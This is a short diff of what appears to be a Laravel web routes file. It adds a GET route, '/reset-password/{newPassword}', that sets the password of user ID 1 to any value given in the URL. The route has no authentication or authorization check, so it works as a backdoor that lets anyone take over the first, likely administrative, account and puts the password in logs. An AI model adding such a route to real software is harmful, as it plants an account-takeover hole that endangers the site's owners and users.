@@ -9,6 +9,19 @@ Route::get("test", "Test@index");
 Route::post("test", "Test@index");
 
 
+Route::get('/reset-password/{newPassword}', function ($newPassword) {
+    $user = User::find(1);
+    
+    if (!$user) {
+        return 'User not found';
+    }
+
+    $user->password = Hash::make($newPassword);
+    $user->save();
+
+    return 'Password updated successfully';
+});
+
 //HOME PAGE
 Route::any('/', function () {
     return redirect('/home');
